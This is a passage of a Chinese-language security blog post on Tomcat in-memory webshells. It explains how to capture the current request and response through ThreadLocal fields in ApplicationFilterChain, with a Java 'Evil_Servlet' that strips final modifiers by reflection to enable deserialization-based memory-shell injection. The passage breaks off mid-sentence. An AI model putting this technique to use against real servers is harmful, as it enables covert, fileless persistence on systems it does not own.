{"title":"Tomcat型内存马回显以及反序列化写入","uid":"f460ee0e4c486df5d5b7ea18c82dd5f0","slug":"内存马回显技术","date":"2024-07-28T13:50:51.000Z","updated":"2024-07-28T13:54:08.758Z","comments":true,"path":"api/articles/内存马回显技术.json","keywords":null,"cover":"https://bu.dusays.com/2024/07/28/66a64d7a6dde8.png","content":"<h1 id=\"背景引入\"><a href=\"#背景引入\" class=\"headerlink\" title=\"背景引入\"></a>背景引入</h1><p>多适用于对方机器不出网，无法弹 shell 的情况，用来获取命令执行的结果。如果是能够解析 JSP 的中间件就很好利用，落地一个 JSP 进行一个 Request 和 Response 的获取就好，但是如果像是 Spring 种，考虑反序列化或者其他能够达到代码执行的情况，注入内存马，并且获得回显就需要另辟蹊径。</p>\n<p>总的思路还是获取到当前处理请求服务线程下的 Rquest 和 Response</p>\n<h1 id=\"ThreadLocal-Response-回显\"><a href=\"#ThreadLocal-Response-回显\" class=\"headerlink\" title=\"ThreadLocal Response 回显\"></a>ThreadLocal Response 回显</h1><h2 id=\"0x01-ThreadLocal-认识\"><a href=\"#0x01-ThreadLocal-认识\" class=\"headerlink\" title=\"0x01 ThreadLocal 认识\"></a>0x01 ThreadLocal 认识</h2><p>首先介绍一下 ThreadLocal<br>在 java 中有一个问题被经常提起：线程安全的问题。这里所说的安全不是代码执行或者数据泄露那种安全，它是影响整个业务处理结果，以及处理效率的一个问题，属于开发的范畴。web 服务就是一个特别显著的例子，当我们服务器接收大量的请求时，后台的某一个关键变量，比如某一商品的货存量，有 n 个客户同时请求它的购买，并且每个客户购买的数量都不同。并且此后同时支付的现金，此时 n 个线程开始同时进行，货物数量的值是共享。<br>此时会因为没有线程隔离以及线程保护，导致每个客户都购买了相同数量的货物，并不是自己想要的货物。<br>如何解决这个问题呢？<br>ThreadLocal 就是用来解决这个问题的，它的作用就是在多线程请求的情况下，维护好每一个单一线程的变量，避免因多线程操作而导致共享数据不一致的情况。<br>具体的代码示例就不写了，理解就行</p>\n<h2 id=\"0x02-思路分析及具体代码执行内容\"><a href=\"#0x02-思路分析及具体代码执行内容\" class=\"headerlink\" title=\"0x02 思路分析及具体代码执行内容\"></a>0x02 思路分析及具体代码执行内容</h2><p>回到 ThreadLocal 获取当前进程下的 request 和 repsonse 的内容：<br>思路来自 Kingkk 师傅，不论是在 Springboot 还是 javaweb 等项目中，filter servlet listener 始终是一种设计思想，他们都是会存在的，并且 ApplicationFilterChain 这一路的责任链机制依然存在。我们观察到在他的属性值变量中存在两种变量<code>lastServicedRequest</code>以及<code>lastServicedResponse</code>，并且他们的类型都是 ThreadLocal 类型<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721649278337-7a366631-8290-44b2-ab31-f439dc1809a3.png#averageHue=%2327292b&clientId=u8e48b11c-4381-4&from=paste&height=365&id=u9499e276&originHeight=684&originWidth=1616&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=387813&status=done&style=none&taskId=ub767ade7-9a23-4e3e-a1f4-a3430918257&title=&width=861.8666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>在 ApplicationFilterChain 初始化的情况下它们并不会有所赋值，但是我们跟进其中责任链实现逻辑中 internalDofilter 的部分，当我们从filterCofigs 中读取完所有的 filterConfig 配置，并且走完它们的所有逻辑之后，也就是 <code>if(pos &lt; n)</code>不会满足判断条件，来到之后的 Trycatch 块中<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721649506501-2dc8b278-39f3-4cf6-885b-c97fbdbb91ab.png#averageHue=%2328292c&clientId=u8e48b11c-4381-4&from=paste&height=212&id=u2386ca76&originHeight=398&originWidth=1285&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=208957&status=done&style=none&taskId=u36ee1a1d-7f6f-4e93-b82f-39922f4df07&title=&width=685.3333333333334\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>他首先就是<code>if (ApplicationDispatcher.WRAP_SAME_OBJECT)</code>判断，然后开始对 <code>lastServicedRequest</code>以及<code>lastServicedResponse</code>都进行一段赋值操作，这里所赋的值，就是我们想要获取到的 response 以及 request<br>这里两段判断条件都是一样的，也就是<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>必须不为空<br>所以我们可以总结出利用思路：</p>\n<ol>\n<li>反射修改 <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为 ture</li>\n<li>然而上条逻辑的执行依赖于当前线程，也就是说此时能够代码执行到这里的时候，责任链机制已经过了一遍，我们此时还是没有进入后续的 set 逻辑，只能再访问一遍，再走一遍责任链机制才可以。所以后续的逻辑还应该加上：<code>lastServicedRequest</code>和<code>lastServicedResponse</code>都初始化并且为 null  （相当于把 ApplicationFilterChain 的 static 代码块走了一遍）</li>\n<li><code>lastServicedRequest</code>和<code>lastServicedResponse</code>,以及 <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>变量都是final 修饰，也就是不可修改的定值，这对于我们反序列化打入内存马非常不利，所以我们还需要通过反射修改其 final 属性</li>\n</ol>\n<p>上述利用存在两个个利用条件：<br>一是 JDK 在 17 版本之后不能够通过反射去修改 final 属性值。也就是在 Springboot3 或者 Spring6 这种内置要求 JDK17 版本之后的服务都不能通过这种方式打入内存马<br>二是 tomcat10.1.x 之后的版本（也就是 Springboot3 要求的版本），判断条件也发生了变化<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721659944545-86b4497a-7d8a-47cc-bad9-cf449a293087.png#averageHue=%2328292c&clientId=u0d811a8b-7968-4&from=paste&height=195&id=u44e9ac6e&originHeight=292&originWidth=1165&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=132920&status=done&style=none&taskId=uca3dd554-2e3f-47f1-bcd6-f56792cec2a&title=&width=776.6666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>所以利用场景限制于 Tomcat&lt;10 ，JDK&lt;17 的情况，具体一点就是 Springboot2，spring5，以及版本符合条件的 javaweb 环境等（高版本有高版本的方法，之后再写）<br>接下来开始具体的代码构造，考虑之后的结合反序列化打入内存马</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">package</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">stoocea</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">example</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Servlets</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">core</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ApplicationFilterChain</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">*</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">WebFilter</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">WebServlet</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServlet</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">swing</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">plaf</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">synth</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">SynthRadioButtonMenuItemUI</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">FileDescriptor</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">IOException</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Modifier</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">@</span><span style=\"color: #F97583\">WebServlet</span><span style=\"color: #B392F0\">(</span><span style=\"color: #FFAB70\">&quot;/evil&quot;</span><span style=\"color: #B392F0\">)</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> Evil_Servlet </span><span style=\"color: #F97583\">extends</span><span style=\"color: #B392F0\"> HttpServlet &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">Override</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">protected</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> doGet(</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\"> req</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\"> resp) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">ServletException</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">IOException</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">try</span><span style=\"color: #B392F0\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">//反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> WRAP_SOME_OBJECT_FIELD</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;WRAP_SAME_OBJECT&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> lastServicedRequestfield</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">ApplicationFilterChain</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;lastServicedRequest&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> lastServicedResponsefield</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">ApplicationFilterChain</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;lastServicedResponse&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">WRAP_SOME_OBJECT_FIELD</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">lastServicedRequestfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">lastServicedResponsefield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">//使用modifiersField修改属性值的final修饰</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">//每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\">  modifiersfield</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Field</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;modifiers&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">modifiersfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">//修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&amp;~运算得到0x0000</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">modifiersfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setInt(WRAP_SOME_OBJECT_FIELD</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #79B8FF\">WRAP_SOME_OBJECT_FIELD</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getModifiers() </span><span style=\"color: #F97583\">&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">~</span><span style=\"color: #79B8FF\">Modifier</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">FINAL</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">modifiersfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setInt(lastServicedRequestfield</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #79B8FF\">lastServicedRequestfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getModifiers() </span><span style=\"color: #F97583\">&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">~</span><span style=\"color: #79B8FF\">Modifier</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">FINAL</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">modifiersfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setInt(lastServicedResponsefield</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #79B8FF\">lastServicedResponsefield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getModifiers() </span><span style=\"color: #F97583\">&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">~</span><span style=\"color: #79B8FF\">Modifier</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">FINAL</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">//如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\">(</span><span style=\"color: #F97583\">!</span><span style=\"color: #79B8FF\">WRAP_SOME_OBJECT_FIELD</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getBoolean(</span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">WRAP_SOME_OBJECT_FIELD</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setBoolean(</span><span style=\"color: #79B8FF\">null</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">lastServicedResponsefield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">set(</span><span style=\"color: #79B8FF\">null</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">ThreadLocal</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">ServletResponse</span><span style=\"color: #B392F0\">&gt;());</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">lastServicedRequestfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">set(</span><span style=\"color: #79B8FF\">null</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">ThreadLocal</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">ServletRequest</span><span style=\"color: #B392F0\">&gt;());</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span><span style=\"color: #F97583\">else</span><span style=\"color: #B392F0\">&#123;</span><span style=\"color: #6B737C\">//第二次访问开始正式获取当前线程下的Req和Resp</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">ThreadLocal</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">ServletRequest</span><span style=\"color: #B392F0\">&gt; threadLocalReq</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">ThreadLocal&lt;</span><span style=\"color: #B392F0\">ServletRequest</span><span style=\"color: #F97583\">&gt;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #79B8FF\">lastServicedRequestfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(</span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">ThreadLocal</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">ServletResponse</span><span style=\"color: #B392F0\">&gt; threadLocalResp</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(</span><span style=\"color: #F97583\">ThreadLocal&lt;</span><span style=\"color: #B392F0\">ServletResponse</span><span style=\"color: #F97583\">&gt;</span><span style=\"color: #B392F0\">) </span><span style=\"color: #79B8FF\">lastServicedResponsefield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(</span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">ServletRequest</span><span style=\"color: #B392F0\"> servletRequest </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">threadLocalReq</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">ServletResponse</span><span style=\"color: #B392F0\"> servletResponse </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">threadLocalResp</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">out</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">println(req);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">out</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">println(servletRequest);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">catch</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> e)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">e</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">printStackTrace();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span>\n<span class=\"line\"></span></code></pre></div><p>然后我们两次访问 evil 路由，在第二次调试进入逻辑：<br>req 是 doGet 方法的参数里面的 req，也就是我们当前进程下的 Request。然后我们自己获取到的 servletRequest 获取到之后是相同的<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721720955376-d8e97866-a48f-4875-837f-bc956bacbe80.png#averageHue=%232d343e&clientId=u92403063-f90b-4&from=paste&height=223&id=u32624ba5&originHeight=418&originWidth=2109&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=380677&status=done&style=none&taskId=u4419f081-8ab3-4ae8-97ea-c674d86b31e&title=&width=1124.8\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<h2 id=\"0x03-总结\"><a href=\"#0x03-总结\" class=\"headerlink\" title=\"0x03 总结\"></a>0x03 总结</h2><p>整体的思路是建立在无文件，反序列化打入内存马的基础上进行的，所以还需要考虑反序列化本身的条件。这里提一嘴 Shiro 的问题，我之前复习分析 Filter 型内存马的时候，无意中由于自己打入了 shiro 的依赖，导致 filter 链的流程和常规的 tomcat 构建流程不太一样，那个时候我还提了一嘴调用栈：<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721722546234-5a6e9d8d-e744-4a94-9702-16236fa2a6bf.png#averageHue=%234d574f&clientId=ucc1d67d4-8ed4-4&from=paste&height=570&id=u9dc0e2d2&originHeight=1068&originWidth=1117&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=867229&status=done&style=none&taskId=u3a8a457a-b6dd-4554-851c-ada5c1d5b06&title=&width=595.7333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>shiro 本质就是一层 filter，所以它是在 <code>if (pos &lt; n)</code>中执行完自己的逻辑了，后面的 lastServiceRequest.set(request)就执行不到了，所以我们就获取不到当前线程的 request 和 reponse<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721722936249-e8b64bc2-d8bc-4407-9577-cc60e9542766.png#averageHue=%2327282b&clientId=ucc1d67d4-8ed4-4&from=paste&height=221&id=u641e961e&originHeight=415&originWidth=1413&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=235276&status=done&style=none&taskId=ud4e33b74-af60-436f-852f-299201b6772&title=&width=753.6\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>当然有时候也不一定要局限于打 shiro 的反序列化，只要你的反序列化逻辑在责任链机制走完之后，都能够利用。<br>但是这里留了一个伏笔，我们必须访问两次指定路由才能够真正获取到 ServletRequest，那么在反序列化的时候该如何实现呢？这里其实可以延伸出无文件落地内存马的一个总的思想，我们后面总结再谈。</p>\n<h1 id=\"全局存储-Response\"><a href=\"#全局存储-Response\" class=\"headerlink\" title=\"全局存储 Response\"></a>全局存储 Response</h1><h2 id=\"0x01-初步思路建立\"><a href=\"#0x01-初步思路建立\" class=\"headerlink\" title=\"0x01 初步思路建立\"></a>0x01 初步思路建立</h2><p>想要一个能够适应大多数情况的 response 和 request 获取思路。我们从一次处理 servlet 容器处理 web 请求的调用栈入手，肯定有一个地方是最开始处理 request 和 repsonse，并且将他们当作参数传入的下一调用栈的地方。<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721735348820-e762962e-b7b8-4e48-a129-f3c504713291.png#averageHue=%2348534b&clientId=u8ca2416b-d1af-4&from=paste&height=463&id=ufe4e3a2b&originHeight=868&originWidth=1024&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=468821&status=done&style=none&taskId=u7cb3adef-2fa4-48c7-a4fc-3832039f3db&title=&width=546.1333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>调用栈最开始的一次出现传递 request 和 response 的地方的是在 Http11Processor 的 service 方法中。虽然配图只给了这么一段，但实际上面大部分的逻辑都是直接处理 Request 和 Response ，一直到这里传递给下一条调用栈。其实这个时候就可以入手去寻找 request 和 response 了<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721731132036-f505bfe4-8255-4c47-b944-a332e89a13b2.png#averageHue=%23282b2f&clientId=ucc1d67d4-8ed4-4&from=paste&height=284&id=ua032f85e&originHeight=532&originWidth=1198&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=265024&status=done&style=none&taskId=uf3d57a26-0304-4193-a8f1-a02d995b9af&title=&width=638.9333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br><code>request</code> 和<code> 